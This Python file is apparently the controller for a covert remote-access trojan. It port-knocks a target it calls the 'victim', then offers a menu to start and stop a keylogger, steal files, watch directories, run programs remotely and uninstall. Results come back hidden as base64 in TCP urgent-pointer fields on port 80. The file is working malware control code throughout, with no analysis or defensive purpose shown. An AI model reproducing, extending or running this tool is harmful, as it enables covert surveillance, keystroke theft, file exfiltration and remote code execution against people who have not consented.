import os
import base64
import threading
from scapy.all import sniff, TCP, send, IP, Raw, conf
import sys
import socket
import time

# Disable Scapy verbose mode
conf.verb = 0

eof_signal = 65535  # End of file signal
received_data = ""
current_signal = None
sniffing = False
dest_ip = None
sniffing_event = threading.Event()
ack_event = threading.Event()
sniff_thread = None
timeout = 10  # Timeout in seconds for acknowledgment

def get_local_ip():
    """Get the local IP address of the machine."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external IP to get the local IP address
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip

def send_signal(signal):
    """Send a signal using the encoder script."""
    os.system(f"python3 encoder.py {signal}:{dest_ip}")

def start_keylogger():
    """Start the keylogger by sending the start signal."""
    send_signal("KL_START")
    print("Keylogger started.")

def stop_keylogger():
    """Stop the keylogger by sending the stop signal and wait for the log file."""
    global current_signal
    current_signal = "KL_STOP"
    send_signal("KL_STOP")
    print("Keylogger stopped. Waiting for log file...")
    start_sniffing(False)

def start_file_transfer(file_path):
    """Start the file transfer by sending the file transfer signal."""
    global current_signal
    current_signal = "FT"
    os.system(f"python3 encoder.py FT:{dest_ip} {file_path}")
    print("File transfer signal sent.")

def start_file_grabber(file_path):
    global current_signal
    current_signal = "GRAB"
    os.system(f"python3 encoder.py GRAB:{dest_ip} {file_path}")
    print("File grabber signal sent.")
    start_sniffing()
    
def start_watcher(file_path):
    os.system(f"python3 encoder.py WT_START:{dest_ip} {file_path}")
    print("Watcher signal sent.")
    start_sniffing()
    print("Press Enter to stop the watcher.")
    input()
    stop_sniffing()

def start_runner(program):
    global current_signal
    current_signal = "RUN"
    os.system(f"python3 encoder.py RUN:{dest_ip} {program}")
    print("Run signal sent.")
    start_sniffing()

def uninstall():
    """Uninstall the program by sending the uninstall signal."""
    os.system(f"python3 encoder.py UNINSTALL:{dest_ip}")
    print("Uninstall signal sent.")
    sys.exit(0)

def packet_callback(packet):
    """Callback function to process each sniffed packet."""
    global received_data
    global current_signal
    if packet.haslayer(TCP) and packet[TCP].flags == "PAU":
        urgent_pointer_value = packet[TCP].urgptr
        urgent_pointer_chunk = urgent_pointer_value.to_bytes(2, 'big').decode(errors='ignore')
        received_data += urgent_pointer_chunk

        #print(f"Received Urgent Pointer: {urgent_pointer_value}")
        #print(f"Received Data Chunk: {urgent_pointer_chunk}")

        try:
            padded_data = received_data + '=' * ((4 - len(received_data) % 4) % 4)
            decoded_data = base64.b64decode(padded_data).decode(errors='ignore')
            #print(f"Decoded Data: {decoded_data}")
            if urgent_pointer_value == eof_signal:
                print("EOF signal detected.")
                if current_signal == "RUN":
                    print(f"Program output:\n{decoded_data}")
                else:
                    save_file(decoded_data)
                current_signal = None  # Reset current_signal after handling
                received_data = ""  # Reset received_data after handling
                # exit thread if EOF is detected
                sniffing_event.set()
        except (UnicodeDecodeError, base64.binascii.Error) as e:
            # ignore decoding errors and continue
            pass

def start_sniffing(threaded=True):
    """Start sniffing for packets."""
    global sniffing, sniff_thread
    sniffing = True
    sniffing_event.clear()
    local_ip = get_local_ip()
    print("Waiting for response...")
    if threaded:
        if not sniff_thread or not sniff_thread.is_alive():
            sniff_thread = threading.Thread(target=sniff_packets, args=(local_ip,))
            sniff_thread.start()
    else:
        sniff_packets(local_ip)

def sniff_packets(local_ip):
    """Sniff packets in a separate thread."""
    sniff(filter=f"tcp and dst host {local_ip} and dst port 80", prn=packet_callback, store=0, stop_filter=lambda x: sniffing_event.is_set())

def stop_sniffing():
    """Stop sniffing for packets."""
    # forcefully stop sniffing
    if sniffing:
        sniffing_event.set()
        sniffing = False
        print("Sniffing stopped.")

def save_file(encoded_data):
    """Save the file from the encoded data."""
    metadata, file_content = split_metadata_content(encoded_data)
    if not metadata:
        print("No metadata found, skipping file save.")
        return
    file_name = metadata.strip()
    file_content = file_content.strip()  # Decode the file content
    if file_content is None:
        print("No file content found, skipping file save.")
        return
    
    save_to_file(file_name, file_content)
    if file_name.endswith(".deleted"):
        original_file = file_name[:-8]  # Remove the ".deleted" extension
        original_file_path = os.path.join(os.getcwd(), dest_ip, original_file.lstrip('/'))
        if os.path.exists(original_file_path):
            os.remove(original_file_path)
            print(f"Original file {original_file_path} deleted.")

def decode_base64_data(encoded_data):
    """Decode base64 encoded data."""
    try:
        padded_data = encoded_data + '=' * ((4 - len(encoded_data) % 4) % 4)
        decoded_data = base64.b64decode(padded_data).decode(errors='ignore')
        print(f"Decoded base64 data: {decoded_data}")
        return decoded_data
    except (UnicodeDecodeError, base64.binascii.Error) as e:
        print(f"Decoding error: {e}")
        return None

def split_metadata_content(decoded_data):
    """Split the decoded data into metadata and content."""
    parts = decoded_data.split('|', 1)
    if len(parts) == 2:
        print(f"Metadata: {parts[0]}, Content: {parts[1]}")
        return parts[0], parts[1]
    else:
        print(f"Error splitting metadata and content. Decoded data: {decoded_data}")
        return None, None

def save_to_file(file_name, content):
    """Save the content to a file."""
    global dest_ip
    # Create the base directory using dest_ip
    base_dir = os.path.join(os.getcwd(), dest_ip)
    os.makedirs(base_dir, exist_ok=True)
    
    # Handle file paths with directories
    file_path = os.path.join(base_dir, file_name.lstrip('/'))
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    
    with open(file_path, 'w') as file:
        file.write(content)
    print(f"File {file_path} created successfully.")

def send_knock_sequence(dest_ip, sequence):
    """Send the port-knocking sequence to the victim."""
    global ack_event
    ack_event.clear()
    
    # Send knock sequence
    for port in sequence:
        port = int(port)
        send_packet(dest_ip, port)
    
    print("Waiting for acknowledgment...")
    # Wait for acknowledgment with timeout
    if ack_event.wait(timeout):
        print("Received acknowledgment. Continuing...")
    else:
        print("No acknowledgment received. Exiting.")
        sys.exit(1)
    
def close_connection():
    """Close the connection by sending a FIN packet."""
    global current_signal
    current_signal = "CLOSE"
    send_signal("CLOSE")
    print("Connection closed.")
    sys.exit(0)

def send_packet(dest_ip, port):
    """Send a TCP packet to the specified port."""
    ip = IP(dst=dest_ip)
    tcp = TCP(dport=port, flags="S")
    packet = ip/tcp
    send(packet)

def ack_callback(packet):
    """Callback function to handle acknowledgment packets."""
    try:
        if (packet.haslayer(TCP) and 
            packet[TCP].flags & 0x12 and  # SYN-ACK flags
            packet.haslayer(Raw) and 
            b'ACK' in packet[Raw].load):
            ack_event.set()
    except AttributeError:
        pass  # Ignore packets without the expected layers/attributes

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_menu():
    """Display the options menu."""
    print("Choose an option:")
    print("1. Start Keylogger")
    print("2. Stop Keylogger")
    print("3. File Send")
    print("4. File Receive")
    print("5. File/Dir Watcher")
    print("6. Run Program")
    print("7. Exit")
    print("8. Uninstall")

def main():
    """Main function to handle user input and execute corresponding actions."""
    global current_signal, dest_ip
    dest_ip = input("Enter the destination IP for sending signals: ")
    knock_sequence = input("Enter the port-knocking sequence (comma-separated): ").split(",")

    # Start sniffing for acknowledgment packets with more specific filter
    sniff_thread = threading.Thread(
        target=sniff, 
        kwargs={
            'filter': f"tcp and src host {dest_ip} and (tcp[13] & 0x12 != 0)", 
            'prn': ack_callback, 
            'store': 0
        }
    )
    sniff_thread.daemon = True  # Make thread daemon so it exits when main thread exits
    sniff_thread.start()

    # Send the port-knocking sequence
    send_knock_sequence(dest_ip, knock_sequence)

    options = {
        "1": lambda: start_keylogger(),
        "2": lambda: stop_keylogger(),
        "3": lambda: start_file_transfer(input("Enter the file path to transfer: ")),
        "4": lambda: start_file_grabber(input("Enter the file path to receive: ")),
        "5": lambda: start_watcher(input("Enter the file or directory to watch: ")),
        "6": lambda: start_runner(input("Enter the program to run: ")),
        "7": lambda: close_connection(),
        "8": lambda: uninstall(),
    }

    while True:
        clear_screen()  # Clear the terminal screen after the option is executed
        display_menu()  # Display the menu at the top
        choice = input("Enter your choice: ")

        if choice in options:
            options[choice]()  # Execute the selected option
            
        else:
            print("Invalid choice.")
            time.sleep(1)  # Pause briefly to allow the user to see the message
if __name__ == "__main__":
    main()
